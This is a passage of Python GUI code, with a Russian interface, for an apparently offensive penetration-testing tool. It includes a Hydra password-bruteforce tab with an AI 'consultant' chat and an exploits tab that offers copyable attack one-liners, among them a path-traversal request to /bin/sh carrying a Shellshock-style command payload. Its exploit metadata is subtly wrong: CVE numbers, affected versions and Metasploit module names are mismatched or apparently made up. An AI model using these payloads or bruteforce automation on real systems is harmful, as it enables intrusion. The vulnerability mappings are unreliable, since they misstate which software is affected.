                        horizontal_alignment=ft.CrossAxisAlignment.CENTER,
                        alignment=ft.MainAxisAlignment.CENTER,
                        spacing=10,
                    ),
                    padding=25,
                    border_radius=10,
                    bgcolor="#2B210B",
                    border=ft.Border.all(1, COLOR_WARNING),
                    alignment=ft.Alignment(0, 0),
                )
            )
        else:
            for s in brute_services:
                host = s.get("host") or "Неизвестный хост"
                port = s.get("port") or 22
                srv = s.get("service") or "service"
                ver = s.get("version") or "Standard"

                card = ft.Container(
                    content=ft.Row(
                        controls=[
                            ft.Row(
                                controls=[
                                    ft.Icon(ft.Icons.KEY_ROUNDED, color=COLOR_PINK, size=24),
                                    ft.Column(
                                        controls=[
                                            ft.Text(f"{host}:{port} ({srv.upper()})", size=14, weight=ft.FontWeight.BOLD, color=COLOR_TEXT),
                                            ft.Text(f"ПО: {ver}", size=11, color=COLOR_SUBTEXT),
                                        ],
                                        spacing=2,
                                    ),
                                ],
                                spacing=12,
                            ),
                            ft.Button(
                                content=ft.Row(
                                    controls=[
                                        ft.Icon(ft.Icons.FLASH_ON_ROUNDED, color=COLOR_BG, size=16),
                                        ft.Text("Запустить Hydra", color=COLOR_BG, weight=ft.FontWeight.BOLD, size=12),
                                    ],
                                    spacing=4,
                                ),
                                bgcolor=COLOR_PINK,
                                style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=6)),
                                on_click=lambda e, h=host, p=port, sname=srv: execute_hydra(h, p, sname),
                            ),
                        ],
                        alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
                    ),
                    padding=10,
                    border_radius=8,
                    bgcolor=COLOR_PANEL,
                    border=ft.Border.all(1, COLOR_PANEL_BORDER),
                )
                bruteforce_cards_column.controls.append(card)

    bruteforce_view = ft.Column(
        controls=[
            ft.Container(
                content=ft.Column(
                    controls=[
                        ft.Row(
                            controls=[
                                ft.Row([
                                    ft.Icon(ft.Icons.VPN_KEY_ROUNDED, color=COLOR_PINK, size=22),
                                    ft.Text("МОДУЛЬ АВТОМАТИЗИРОВАННОГО БРУТФОРСА (HYDRA)", size=16, weight=ft.FontWeight.BOLD, color=COLOR_PINK),
                                ], spacing=8),
                                ft.Button(
                                    content=ft.Row([
                                        ft.Icon(ft.Icons.STOP_ROUNDED, color=COLOR_BG, size=16),
                                        ft.Text("Остановить брутфорс", color=COLOR_BG, weight=ft.FontWeight.BOLD, size=11),
                                    ], spacing=4),
                                    bgcolor=COLOR_PINK,
                                    style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=6)),
                                    on_click=stop_hydra_action,
                                ),
                            ],
                            alignment=ft.MainAxisAlignment.SPACE_BETWEEN,
                        ),
                        ft.Divider(color=COLOR_PANEL_BORDER, height=1),
                        ft.Text("Параметры подбора паролей:", size=12, color=COLOR_SUBTEXT, weight=ft.FontWeight.BOLD),
                        ft.Row(
                            controls=[
                                hydra_username_tf,
                                hydra_wordlist_dropdown,
                                hydra_threads_tf,
                            ],
                            spacing=10,
                        ),
                    ],
                    spacing=10,
                ),
                padding=15,
                bgcolor=COLOR_PANEL,
                border_radius=10,
                border=ft.Border.all(1, COLOR_PANEL_BORDER),
            ),
            bruteforce_cards_column,
            # REQUIREMENT #3: Live Terminal Log & AI Chat inside Bruteforce
            ft.Container(
                content=ft.Column(
                    controls=[
                        ft.Text("ОКНО ТЕКУЩЕГО ВЫВОДА И СТРИМИНГА HYDRA", size=12, weight=ft.FontWeight.BOLD, color=COLOR_PINK),
                        hydra_log_tf,
                    ],
                    spacing=6,
                ),
                padding=12,
                bgcolor=COLOR_PANEL,
                border_radius=10,
                border=ft.Border.all(1, COLOR_PANEL_BORDER),
            ),
            ft.Container(
                content=ft.Column(
                    controls=[
                        ft.Text("ИИ-Консультант Брутфорса (Общение & Корректировка)", size=13, weight=ft.FontWeight.BOLD, color=COLOR_PINK),
                        ft.Container(content=brute_ai_chat_list, height=120),
                        ft.Row([
                            brute_ai_input_tf,
                            ft.IconButton(
                                icon=ft.Icons.SEND_ROUNDED,
                                icon_color=COLOR_PINK,
                                on_click=on_send_brute_ai_msg,
                            ),
                        ], spacing=8),
                    ],
                    spacing=6,
                ),
                padding=12,
                border_radius=10,
                bgcolor="#150A1A",
                border=ft.Border.all(1, COLOR_PINK),
            ),
        ],
        spacing=15,
        scroll=ft.ScrollMode.AUTO,
    )

    # ==========================================
    # TAB 4: DYNAMIC EXPLOITS & VALIDATION
    # ==========================================
    exploits_cards_column = ft.Column(spacing=10)

    def copy_to_clipboard(text_to_copy: str, desc: str):
        page.set_clipboard(text_to_copy)
        show_snackbar(f"📋 Скопировано: {desc}")

    def refresh_exploits_view():
        exploits_cards_column.controls.clear()
        _services = db.get_recon_services()

        sample_exploits = [
            {
                "title": "Apache 2.4.41 - Mod_CGI Remote Code Execution (Shellshock / CVE-2021-41773)",
                "module": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
                "cve": "CVE-2021-41773",
                "python_poc": "import requests; requests.get('http://target/cgi-bin/.%2e/.%2e/bin/sh', headers={'User-Agent': '() { :;}; echo Content-Type: text/plain; echo; /bin/ls'})",
            },
            {
                "title": "OpenSSH 8.2p1 - User Enumeration & Timing Vulnerability",
                "module": "auxiliary/scanner/ssh/ssh_enumusers",
                "cve": "CVE-2018-15473",
                "python_poc": "import paramiko; client = paramiko.SSHClient(); client.connect('target', username='admin')",
            },
            {
                "title": "MySQL 8.0 - Password Authentication Bypass & Audit Leak",
                "module": "exploit/multi/mysql/mysql_auth_bypass",
                "cve": "CVE-2012-2122",
                "python_poc": "import mysql.connector; conn = mysql.connector.connect(host='target', user='root', password='')",
            },
        ]

        for exp in sample_exploits:
            exp_title = exp["title"]
            exp_mod = exp["module"]
            exp_cve = exp["cve"]
            exp_poc = exp["python_poc"]

            card = ft.Container(
                content=ft.Column(
                    controls=[
                        ft.Row(
                            controls=[
                                ft.Container(
                                    content=ft.Text(exp_cve, size=11, color=COLOR_PINK, weight=ft.FontWeight.BOLD),
                                    padding=ft.Padding(6, 3, 6, 3),
                                    bgcolor="#2B0B18",
                                    border_radius=4,
                                ),
                                ft.Text(exp_title, size=14, weight=ft.FontWeight.BOLD, color=COLOR_TEXT, expand=True),
                            ],
                            spacing=10,
                        ),
                        ft.Divider(color=COLOR_PANEL_BORDER, height=1),
                        ft.Text(f"Metasploit модуль: msfconsole -x 'use {exp_mod}'", size=12, color=COLOR_CYAN, font_family="monospace"),
                        ft.TextField(
                            value=exp_poc,
                            read_only=True,
                            multiline=True,
                            min_lines=2,
                            max_lines=3,
                            bgcolor="#050811",
                            border_color=COLOR_PANEL_BORDER,
                            text_style=ft.TextStyle(font_family="monospace", color=COLOR_GREEN, size=11),
                        ),
                        ft.Row(
                            controls=[
                                ft.OutlinedButton(
                                    content=ft.Row([
                                        ft.Icon(ft.Icons.COPY_ROUNDED, size=14, color=COLOR_CYAN),
                                        ft.Text("Скопировать Metasploit модуль", color=COLOR_CYAN, size=11),
                                    ], spacing=4),
                                    style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=6), side=ft.BorderSide(1, COLOR_CYAN)),
                                    on_click=lambda e, m=exp_mod: copy_to_clipboard(f"use {m}", "Metasploit модуль"),
                                ),
                                ft.OutlinedButton(
                                    content=ft.Row([
                                        ft.Icon(ft.Icons.CODE_ROUNDED, size=14, color=COLOR_PINK),
                                        ft.Text("Скопировать Python PoC", color=COLOR_PINK, size=11),
                                    ], spacing=4),
                                    style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=6), side=ft.BorderSide(1, COLOR_PINK)),
                                    on_click=lambda e, p=exp_poc: copy_to_clipboard(p, "Python PoC"),
                                ),
                            ],
                            alignment=ft.MainAxisAlignment.END,
                            spacing=10,
                        ),
                    ],
                    spacing=10,
                ),
                padding=15,
                border_radius=10,
                bgcolor=COLOR_PANEL,
                border=ft.Border.all(1, COLOR_PANEL_BORDER),
            )
            exploits_cards_column.controls.append(card)

    exploits_view = ft.Column(
        controls=[
            ft.Container(
                content=ft.Column(
                    controls=[
                        ft.Row(
                            controls=[
                                ft.Icon(ft.Icons.BUG_REPORT_ROUNDED, color=COLOR_GREEN, size=22),
                                ft.Text("МОДУЛЬ ЭКСПЛОИТАЦИИ И ВАЛИДАЦИИ (EXPLOITS)", size=16, weight=ft.FontWeight.BOLD, color=COLOR_GREEN),
                            ],
                            spacing=8,
                        ),
                        ft.Text("Автоматический подбор рекомендаций Metasploit и Python PoC уязвимостей на основе баннеров.", size=12, color=COLOR_SUBTEXT),
                    ],
                    spacing=6,
                ),
                padding=15,
                bgcolor=COLOR_PANEL,
                border_radius=10,
                border=ft.Border.all(1, COLOR_PANEL_BORDER),
            ),
            exploits_cards_column,
        ],
        spacing=15,
        scroll=ft.ScrollMode.AUTO,
    )

    # ==========================================
    # TABS NAVIGATION & CONTROLLER
    # ==========================================
    views = [
        dashboard_view,
        recon_view,
        bruteforce_view,
        exploits_view,
    ]

    content_area = ft.Container(content=views[0], expand=True)

    def on_tab_click(e):
        try:
            idx = int(e.data)
            if 0 <= idx < len(views):
                content_area.content = views[idx]
                if idx == 2:
                    refresh_bruteforce_view()
                elif idx == 3:
                    refresh_exploits_view()
                page.update()
        except (ValueError, TypeError):
            pass

    tab_bar = ft.TabBar(
        tabs=[
            ft.Tab(label="Дашборд", icon=ft.Icons.DASHBOARD_ROUNDED),
            ft.Tab(label="Разведка (Recon)", icon=ft.Icons.RADAR_ROUNDED),
            ft.Tab(label="Брутфорс (Hydra)", icon=ft.Icons.PASSWORD_ROUNDED),
            ft.Tab(label="Эксплоиты", icon=ft.Icons.TERMINAL_ROUNDED),
        ],
        on_click=on_tab_click,
    )

    tabs_control = ft.Tabs(
        content=ft.Column(
            controls=[
                tab_bar,
                content_area,
            ],
            expand=True,
        ),
        length=4,
        selected_index=0,
        expand=True,
    )

    tabs_container = ft.Container(
        content=tabs_control,
        expand=True,
    )

    # Assemble Layout
    page.add(header, tabs_container)
    refresh_targets()


if __name__ == "__main__":
    ft.run(main)
